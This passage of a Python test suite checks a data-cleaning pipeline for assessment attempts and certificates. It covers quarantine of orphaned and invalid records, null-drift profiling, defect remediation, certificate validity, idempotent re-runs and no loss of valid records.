                    "selected_option_ids": ["  opt_1  ", None, "opt_2"],
                    "is_correct": True
                }
            ],
            "certificates": []
        }
        res = self.engine.run_full_pipeline(raw_data)
        assertion_results = self.engine.run_all_assertions(res["gold"])
        assert assertion_results["all_passed"] is True
        assert assertion_results["failed_count"] == 0

    def test_adv_100_quarantine_isolates_100_percent_of_orphans_and_invalids(self):
        raw_data = {
            "users": [{"id": "u_real", "name": "Real User"}],
            "assessment_attempts": [
                {"id": "att_ok", "user_id": "u_real", "status": "COMPLETED", "score": 90, "total_marks": 100},
                {"id": "att_fake_user", "user_id": "u_fake", "status": "COMPLETED", "score": 90, "total_marks": 100},
                {"id": "att_bad_enum", "user_id": "u_real", "status": "INVALID_STATE", "score": 90, "total_marks": 100}
            ]
        }
        res = self.engine.run_full_pipeline(raw_data)
        quarantine_attempts = res["quarantine"]["quarantine_orphaned_attempts"]
        assert len(quarantine_attempts) == 2
        reasons = {q["quarantine_reason"] for q in quarantine_attempts}
        assert "INVALID_OR_ORPHANED_USER_ID" in reasons
        assert "INVALID_STATUS_ENUM_UNKNOWN" in reasons

    def test_adv_101_dataplex_null_drift_under_1_percent(self):
        raw_attempts = [
            {"id": f"att_{i}", "user_id": f"u_{i % 5}", "score": 50.0, "total_marks": 100.0, "status": "COMPLETED"}
            for i in range(100)
        ]
        base_profile = self.engine.profile_table(raw_attempts)
        stg = self.engine.clean_bronze_to_silver({"assessment_attempts": raw_attempts})
        post_profile = self.engine.profile_table(stg["stg_assessment_attempts"])
        
        drift = self.engine.evaluate_null_drift(base_profile, post_profile, ["attempt_id", "user_id", "score"])
        assert drift["overall_drift_pass"] is True

    def test_adv_102_100_percent_defect_remediation_on_adversarial_data(self):
        catalog = [
            {"defect_class": "DEF-03", "record_id": "att_ts_1", "column": "started_at"},
            {"defect_class": "DEF-04", "record_id": "att_dup_1", "column": "id"},
            {"defect_class": "DEF-06", "record_id": "att_clamp_1", "column": "percentage"},
            {"defect_class": "DEF-07", "record_id": "att_enum_1", "column": "status"},
            {"defect_class": "DEF-08", "record_id": "ans_dirty_1", "column": "selected_option_ids"}
        ]
        gold_dataset = {
            "fct_assessment_attempts": [
                {
                    "attempt_id": "att_ts_1",
                    "started_at_utc": "2026-08-18T15:38:27Z",
                    "status": "COMPLETED",
                    "percentage": 50.0,
                    "score": 50.0,
                    "duration_seconds": 60
                },
                {
                    "attempt_id": "att_dup_1",
                    "started_at_utc": "2026-08-18T15:00:00Z",
                    "status": "COMPLETED",
                    "percentage": 80.0,
                    "score": 80.0,
                    "duration_seconds": 120
                },
                {
                    "attempt_id": "att_clamp_1",
                    "started_at_utc": "2026-08-18T15:00:00Z",
                    "status": "COMPLETED",
                    "percentage": 100.0,
                    "score": 100.0,
                    "duration_seconds": 120
                },
                {
                    "attempt_id": "att_enum_1",
                    "started_at_utc": "2026-08-18T15:00:00Z",
                    "status": "COMPLETED",
                    "percentage": 70.0,
                    "score": 70.0,
                    "duration_seconds": 120
                }
            ],
            "fct_question_responses": [
                {
                    "response_id": "ans_dirty_1",
                    "selected_option_ids": ["Option_A", "Option_B"]
                }
            ]
        }
        remediation = self.engine.evaluate_defect_remediation(catalog, gold_dataset)
        assert remediation["is_100_percent_remediated"] is True
        assert remediation["remediation_rate_pct"] == 100.0

    def test_adv_103_certificate_invariant_enforced_strictly(self):
        raw_data = {
            "users": [{"id": "u_1", "name": "Alice"}],
            "assessment_attempts": [
                {"id": "att_pass", "user_id": "u_1", "status": "COMPLETED", "score": 90, "total_marks": 100, "passed": True},
                {"id": "att_fail", "user_id": "u_1", "status": "COMPLETED", "score": 30, "total_marks": 100, "passed": False}
            ],
            "certificates": [
                {"id": "cert_1", "attempt_id": "att_pass", "user_id": "u_1"},
                {"id": "cert_invalid", "attempt_id": "att_fail", "user_id": "u_1"}
            ]
        }
        res = self.engine.run_full_pipeline(raw_data)
        gold_certs = res["gold"]["fct_certificates"]
        quarantine_certs = res["quarantine"]["quarantine_orphaned_certificates"]
        assert len(gold_certs) == 1
        assert gold_certs[0]["id"] == "cert_1"
        assert len(quarantine_certs) == 1
        assert quarantine_certs[0]["id"] == "cert_invalid"

    def test_adv_104_idempotent_pipeline_re_execution(self):
        raw_data = {
            "users": [{"id": "u_1", "name": "Alice"}],
            "assessment_attempts": [
                {"id": "att_1", "user_id": "u_1", "status": "COMPLETED", "score": 85, "total_marks": 100}
            ]
        }
        res1 = self.engine.run_full_pipeline(raw_data)
        res2 = self.engine.run_full_pipeline(raw_data)
        # Ingested_at timestamp might differ, so compare core fields
        a1 = res1["gold"]["fct_assessment_attempts"][0]
        a2 = res2["gold"]["fct_assessment_attempts"][0]
        assert a1["attempt_id"] == a2["attempt_id"]
        assert a1["score"] == a2["score"]
        assert a1["percentage"] == a2["percentage"]
        assert a1["status"] == a2["status"]

    def test_adv_105_zero_data_loss_on_valid_records(self):
        clean_attempts = [
            {"id": f"att_clean_{i}", "user_id": "u_1", "status": "COMPLETED", "score": float(i), "total_marks": 100.0}
            for i in range(25)
        ]
        raw_data = {
            "users": [{"id": "u_1", "name": "Alice"}],
            "assessment_attempts": clean_attempts
        }
        res = self.engine.run_full_pipeline(raw_data)
        assert len(res["gold"]["fct_assessment_attempts"]) == 25
        assert len(res["quarantine"]["quarantine_orphaned_attempts"]) == 0
